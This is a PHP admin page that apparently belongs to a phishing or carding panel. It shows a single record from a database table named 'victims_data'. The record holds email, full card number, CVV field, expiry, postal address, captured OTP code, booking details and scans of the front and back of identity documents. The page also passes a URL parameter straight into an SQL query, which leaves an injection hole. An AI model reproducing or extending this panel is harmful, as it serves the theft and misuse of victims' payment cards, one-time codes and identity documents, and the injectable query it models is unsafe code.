<?php

include '../../include/global.php';

if (!session())
    redirect('../');
if (isset($_GET['id']))
    $id = $_GET['id'];
?>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title><?= site('name'); ?></title>

    <!-- Fonts -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700;900&display=swap" rel="stylesheet">
    <!-- End fonts -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/css/all.min.css">

    <!-- core:css -->
    <link rel="stylesheet" href="../assets/vendors/core/core.css">
    <!-- endinject -->

    <!-- Plugin css for this page -->
    <link rel="stylesheet" href="../assets/vendors/flatpickr/flatpickr.min.css">
    <!-- End plugin css for this page -->

    <!-- inject:css -->
    <link rel="stylesheet" href="../assets/fonts/feather-font/css/iconfont.css">
    <link rel="stylesheet" href="../assets/vendors/flag-icon-css/css/flag-icon.min.css">
    <!-- endinject -->

    <!-- Layout styles -->
    <link rel="stylesheet" href="../assets/css/demo2/style.min.css">
    <!-- End layout styles -->

    <link rel="shortcut icon" href="../assets/images/favicon.png" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
</head>

<body>
    <div class="main-wrapper">

        <!-- partial:partials/_sidebar.html -->
        <?= load('panel/sidebar'); ?>
        <!-- partial -->

        <div class="page-wrapper">

            <?= load('panel/header'); ?>

            <div class="page-content">








                <style>
                    .flash-notification {
                        animation: flash 3s infinite;
                    }

                    @keyframes flash {
                        0% {
                            background-color: rgba(128, 128, 128, 0.2);
                        }

                        50% {
                            background-color: rgba(128, 128, 128, 1);
                        }

                        100% {
                            background-color: rgba(128, 128, 128, 0.2);
                        }
                    }
                </style>

                <div class="row justify-content-center">
                    <div class="col-lg-12">
                        <div class="card shadow p-4">

                            <?php


                            // Database se record fetch kar rahe hain jo iss id ke sath match karta hai
                            $hosts = fetch("SELECT * FROM `victims_data` WHERE id = '$id'");

                            if (!empty($hosts)) {
                                foreach ($hosts as $host) {
                                    // Aap yahan HTML display kar sakte hain jaise booking details waghera
                                    ?>

                                    <div class="row mb-3 mt-3">
                                        <h3>User Detail</h3>
                                        <hr class="mt-3">
                                        <div class="col-lg-3">
                                            <h6 class="font-weight-bold text-primary">ID *</h6>
                                            <p class="mt-2 h6 bold"><?= htmlspecialchars($host['id']); ?></p>
                                        </div>
                                        <div class="col-lg-3">
                                            <h6 class="font-weight-bold text-primary">Email</h6>
                                            <p class="mt-2 h6 bold"><?= htmlspecialchars($host['email']); ?></p>
                                        </div>

                                    </div>
                                    <div class="row mb-3 mt-3">
                                        <h3>Card Detail</h3>
                                        <hr class="mt-3">
                                        <div class="col-lg-3">
                                            <h6 class="font-weight-bold text-primary">Cvv</h6>
                                            <p class="mt-2 h6 bold"><?= htmlspecialchars($host['ccexpiration']); ?></p>
                                        </div>
                                        <div class="col-lg-3">
                                            <h6 class="font-weight-bold text-primary">Card Number</h6>
                                            <p class="mt-2 h6 bold"><?= htmlspecialchars($host['ccnumber']); ?></p>
                                        </div>
                                        <div class="col-lg-3">
                                            <h6 class="font-weight-bold text-primary">Expired</h6>
                                            <p class="mt-2 h6 bold"><?= htmlspecialchars($host['ccexpiration']); ?></p>
                                        </div>
                                    </div>
                                    <div class="row mb-3 mt-3">
                                        <h3>Address</h3>
                                        <hr class="mt-3">

                                        <div class="col-lg-3 mt-3">
                                            <h6 class="font-weight-bold text-primary">Country</h6>
                                            <p class="mt-2 h6 bold"><?= htmlspecialchars($host['displayCountry']); ?></p>
                                        </div>
                                        <div class="col-lg-3 mt-3">
                                            <h6 class="font-weight-bold text-primary">Address One</h6>
                                            <p class="mt-2 h6 bold"><?= htmlspecialchars($host['address1']); ?></p>
                                        </div>
                                        <div class="col-lg-3 mt-3">
                                            <h6 class="font-weight-bold text-primary">Address Two</h6>
                                            <p class="mt-2 h6 bold"><?= htmlspecialchars($host['address2']); ?></p>
                                        </div>
                                        <div class="col-lg-3 mt-3">
                                            <h6 class="font-weight-bold text-primary">City</h6>
                                            <p class="mt-2 h6 bold"><?= htmlspecialchars($host['city']); ?></p>
                                        </div>
                                        <div class="col-lg-3 mt-3">
                                            <h6 class="font-weight-bold text-primary">State</h6>
                                            <p class="mt-2 h6 bold"><?= htmlspecialchars($host['state']); ?></p>
                                        </div>

                                    </div>
                                    <div class="row mb-3 mt-3">
                                        <h3>Booking Details</h3>
                                        <hr class="mt-3">

                                        <div class="col-lg-3 mt-3">
                                            <h6 class="font-weight-bold text-primary">Otp</h6>
                                            <p class="mt-2 h6 bold"><?= htmlspecialchars($host['otp_code']); ?></p>
                                        </div>
                                        <div class="col-lg-3 mt-3">
                                            <h6 class="font-weight-bold text-primary">Address One</h6>
                                            <p class="mt-2 h6 bold"><?= htmlspecialchars($host['address1']); ?></p>
                                        </div>
                                        <div class="col-lg-3 mt-3">
                                            <h6 class="font-weight-bold text-primary">Offer Id</h6>
                                            <p class="mt-2 h6 bold"><?= htmlspecialchars($host['offer_id']); ?></p>
                                        </div>
                                        <div class="col-lg-3 mt-3">
                                            <h6 class="font-weight-bold text-primary">Price</h6>
                                            <p class="mt-2 h6 bold"><?= htmlspecialchars($host['booking_price']); ?></p>
                                        </div>
                                        <div class="col-lg-3 mt-3">
                                            <h6 class="font-weight-bold text-primary">CheckIn</h6>
                                            <p class="mt-2 h6 bold"><?= htmlspecialchars($host['checkin']); ?></p>
                                        </div>
                                        <div class="col-lg-3 mt-3">
                                            <h6 class="font-weight-bold text-primary">CheckOut</h6>
                                            <p class="mt-2 h6 bold"><?= htmlspecialchars($host['checkout']); ?></p>
                                        </div>
                                        <div class="col-lg-3 mt-3">
                                            <h6 class="font-weight-bold text-primary">Booking Date</h6>
                                            <p class="mt-2 h6 bold"><?= htmlspecialchars($host['created_at']); ?></p>
                                        </div>

                                        </div>
                                    <div class="row mb-3 mt-3">
                                        <h3>Booking Images</h3>
                                        <hr class="mt-3">
                                        <div class="col-lg-6">
                                            <h6 class="font-weight-bold text-primary">Front Doc</h6>
                                            <p class="mt-2 h6 bold">
                                                <img src="../assets/document_kyc_verification/<?= htmlspecialchars($host['front_doc']); ?>"
                                                    alt="Front Document" class="w-25 h-50">
                                            </p>
                                        </div>

                                        <div class="col-lg-6">
                                            <h6 class="font-weight-bold text-primary">Back Doc</h6>
                                            <p class="mt-2 h6 bold">
                                                <img src="../assets/document_kyc_verification/<?= htmlspecialchars($host['back_doc']); ?>"
                                                    alt="Back Document" class="w-25 h-50">
                                            </p>
                                        </div>

                                    </div>
                                <?php }
                            } ?>
                            <div class="text-right">
                                <a href="booking.php" class="btn btn-outline-primary">Back</a>
                            </div>
                        </div>
                    </div>


                </div>

            </div>

            <?= load('panel/footer'); ?>

        </div>
    </div>

    <!-- core:js -->
    <script src="../assets/vendors/core/core.js"></script>
    <!-- endinject -->

    <!-- Plugin js for this page -->
    <script src="../assets/vendors/flatpickr/flatpickr.min.js"></script>
    <script src="../assets/vendors/apexcharts/apexcharts.min.js"></script>
    <!-- End plugin js for this page -->

    <!-- inject:js -->
    <script src="../assets/vendors/feather-icons/feather.min.js"></script>
    <script src="../assets/js/template.js"></script>
    <!-- endinject -->

    <!-- Custom js for this page -->
    <script src="../assets/js/dashboard-dark.js"></script>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <!-- End custom js for this page -->

    <script>


    </script>

</body>

</html>